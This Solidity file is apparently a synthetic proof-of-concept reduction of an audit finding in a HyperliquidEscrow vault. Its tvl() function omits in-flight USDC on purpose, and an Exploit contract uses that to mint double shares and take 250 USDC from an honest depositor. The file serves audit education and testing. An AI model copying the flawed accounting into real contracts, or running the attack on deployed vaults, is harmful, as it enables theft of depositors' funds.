// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Blueberry HyperliquidEscrow — [H-01] Escrow.tvl() does not add in-flight
    USDC amount (Pashov Audit Group 2025-05-16, #61494)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: tvl() for non-USDC assets adds in-flight bridge amounts when
    block.number == lastBridgeToL1Block, but the USDC branch only counts
    IERC20.balanceOf and SKIPS in-flight. During a same-block USDC bridge,
    reported TVL (and thus share price) is understated. An attacker deposits
    against the understated TVL, receives excess shares, and profits when the
    in-flight USDC is counted again (or when balance returns).

    Vulnerable USDC branch preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s, uint8 d) {
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function burn(address from, uint256 amt) external {
        balanceOf[from] -= amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal share token.
contract ShareToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function burn(address from, uint256 amt) external {
        balanceOf[from] -= amt;
        totalSupply -= amt;
    }
}

/// @notice Reduced HyperliquidEscrow — USDC tvl omits in-flight bridge amount.
/// Source: HyperliquidEscrow.tvl (Pashov Blueberry 2025-05-16).
contract HyperliquidEscrow {
    uint64 public constant USDC_SPOT_INDEX = 0;
    uint256 public constant EVM_SCALING = 1e12; // 6-dec USDC → 18-dec TVL units

    MockERC20 public immutable usdc;
    ShareToken public immutable shareToken;

    struct InFlight {
        uint256 amount;
        uint256 blockNumber;
    }

    InFlight public inFlightUsdc;
    uint256 public totalShares; // mirror share supply for pricing

    constructor(MockERC20 _usdc, ShareToken _share) {
        usdc = _usdc;
        shareToken = _share;
    }

    /// @notice Honest LP seeds the vault.
    function seed(uint256 amount) external {
        require(usdc.transferFrom(msg.sender, address(this), amount), "in");
        uint256 shares = amount * EVM_SCALING; // 1:1 at empty
        shareToken.mint(msg.sender, shares);
        totalShares += shares;
    }

    /// @notice Simulate bridging `amount` of USDC to L1 in the current block.
    ///         Tokens leave the escrow balance but are still protocol-owned in-flight.
    function bridgeUsdcToL1(uint256 amount) external {
        require(usdc.balanceOf(address(this)) >= amount, "bal");
        usdc.burn(address(this), amount); // leave EVM balance (bridged out)
        inFlightUsdc.amount = amount;
        inFlightUsdc.blockNumber = block.number;
    }

    /// @notice Settle in-flight: USDC returns to escrow balance.
    function settleBridge(uint256 amount) external {
        require(inFlightUsdc.amount >= amount, "if");
        inFlightUsdc.amount -= amount;
        usdc.mint(address(this), amount);
    }

    /// @notice TVL in 18-dec units. USDC branch omits in-flight (the bug).
    function tvl() public view returns (uint256 tvl_) {
        // Reduced single-asset USDC path matching the report's structure:
        uint64 assetIndex = USDC_SPOT_INDEX;
        address assetAddr = address(usdc);
        uint256 evmScaling = EVM_SCALING;

        if (assetIndex == USDC_SPOT_INDEX) {
            // USDC path does NOT add in-flight bridge amount (non-USDC path does)
            tvl_ += MockERC20(assetAddr).balanceOf(address(this)) * evmScaling; // @> VULN: omits in-flight USDC
            // FIX: if (block.number == inFlightUsdc.blockNumber) {
            //          tvl_ += inFlightUsdc.amount * evmScaling;
            //      }
        } else {
            // Non-USDC path (reference — correctly includes in-flight):
            uint256 balance = MockERC20(assetAddr).balanceOf(address(this)) * evmScaling;
            if (block.number == inFlightUsdc.blockNumber) {
                balance += inFlightUsdc.amount * evmScaling;
            }
            tvl_ += balance;
        }
    }

    /// @notice Correct TVL including in-flight (for assertions only).
    function tvlCorrect() public view returns (uint256) {
        uint256 bal = usdc.balanceOf(address(this)) * EVM_SCALING;
        if (block.number == inFlightUsdc.blockNumber) {
            bal += inFlightUsdc.amount * EVM_SCALING;
        }
        return bal;
    }

    /// @notice Deposit USDC against current (buggy) tvl / share price.
    function deposit(uint256 amount) external returns (uint256 shares) {
        // Price shares against pre-deposit TVL (standard ERC4626 convertToShares).
        uint256 tvl_ = tvl();
        if (totalShares == 0 || tvl_ == 0) {
            shares = amount * EVM_SCALING;
        } else {
            // shares = amount * totalShares / (tvl in asset units)
            // tvl is 18-dec; amount is 6-dec → amount * EVM_SCALING is 18-dec asset value
            shares = (amount * EVM_SCALING * totalShares) / tvl_;
        }
        require(usdc.transferFrom(msg.sender, address(this), amount), "in");
        shareToken.mint(msg.sender, shares);
        totalShares += shares;
    }

    function redeem(uint256 shares) external returns (uint256 assetsOut) {
        uint256 tvl_ = tvlCorrect(); // settle against real value for harm realization
        assetsOut = (shares * tvl_) / totalShares;
        uint256 usdcOut = assetsOut / EVM_SCALING;
        shareToken.burn(msg.sender, shares);
        totalShares -= shares;
        require(usdc.transfer(msg.sender, usdcOut), "out");
    }
}

/// @notice Deposit during understated USDC TVL → excess shares → profit on redeem.
contract Exploit {
    MockERC20 public usdc; // CREATE nonce 1
    ShareToken public shareToken; // CREATE nonce 2
    HyperliquidEscrow public escrow; // CREATE nonce 3 — vulnerable

    uint256 public tvlBuggyDuringBridge;
    uint256 public tvlCorrectDuringBridge;
    uint256 public attackerShares;
    uint256 public attackerProfit;

    constructor() {
        usdc = new MockERC20("USDC", 6);
        shareToken = new ShareToken();
        escrow = new HyperliquidEscrow(usdc, shareToken);
    }

    function run() external {
        // Seed: honest LP deposits 1000e6 USDC → 1000e18 shares, tvl = 1000e18.
        usdc.mint(address(this), 1000e6);
        usdc.approve(address(escrow), type(uint256).max);
        escrow.seed(1000e6);
        require(escrow.tvl() == 1000e18, "seed tvl");

        // Bridge 500e6 USDC out in this block: balance=500, inFlight=500.
        escrow.bridgeUsdcToL1(500e6);
        tvlBuggyDuringBridge = escrow.tvl();
        tvlCorrectDuringBridge = escrow.tvlCorrect();
        // Buggy TVL = 500e18; correct = 1000e18.
        require(tvlBuggyDuringBridge == 500e18, "buggy tvl");
        require(tvlCorrectDuringBridge == 1000e18, "correct tvl");

        // Attacker deposits 500e6 against understated TVL:
        // shares = 500e6 * 1e12 * 1000e18 / 500e18 = 1000e18 (2× fair 500e18).
        usdc.mint(address(this), 500e6);
        attackerShares = escrow.deposit(500e6);
        require(attackerShares == 1000e18, "excess shares");

        // Settle bridge: in-flight returns → escrow holds 1000e6 (500 remain + 500 deposit + 500 return).
        // Wait: after bridge bal=500, deposit +500 → bal=1000, settle +500 → bal=1500.
        escrow.settleBridge(500e6);
        require(usdc.balanceOf(address(escrow)) == 1500e6, "settled bal");

        // Attacker redeems 1000e18 of total 2000e18 shares against true 1500e6 → 750e6.
        // Capital in: 500e6; out: 750e6; profit: 250e6 from the honest LP.
        uint256 before = usdc.balanceOf(address(this));
        escrow.redeem(attackerShares);
        uint256 got = usdc.balanceOf(address(this)) - before;
        attackerProfit = got - 500e6;
        require(got == 750e6, "redeem 750");
        require(attackerProfit == 250e6, "profit 250 USDC");
    }
}
